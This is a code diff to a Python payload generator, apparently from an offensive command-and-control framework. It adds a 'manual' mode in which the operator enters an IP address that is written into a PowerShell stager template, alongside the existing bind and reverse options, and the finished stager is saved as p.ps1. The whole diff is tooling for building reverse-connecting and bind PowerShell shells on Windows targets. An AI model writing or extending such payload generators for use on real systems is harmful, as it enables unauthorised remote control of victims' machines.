@@ -10,15 +10,20 @@ serverlist = []
 def printListener():
     from listener import Server
     while True:
-        bindOrReverse = raw_input(t.bold_green + '[?] (b)ind/[r]everse: ' + t.normal).lower()
-        if bindOrReverse == 'b' or bindOrReverse == 'r':
+        bindOrReverse = raw_input(t.bold_green + '[?] (b)ind/[r]everse/(m)anual: ' + t.normal).lower()
+        if bindOrReverse == 'b' or bindOrReverse == 'r' or bindOrReverse == 'm':
             break
     if bindOrReverse == 'r':
         powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('False', FUNCTIONS().CheckInternet(), '5555')
-    else:
+    if bindOrReverse == 'b':
         powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('True', '', '5556')
+
+    if bindOrReverse == 'm':
+        manualIP = raw_input(t.bold_green + '[?] IP Addr: ' + t.normal).lower()
+        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
+        windows_powershell_stager = powershellContent % ('False', manualIP, '5555')
 
     powershellFileName = 'p.ps1'
     with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
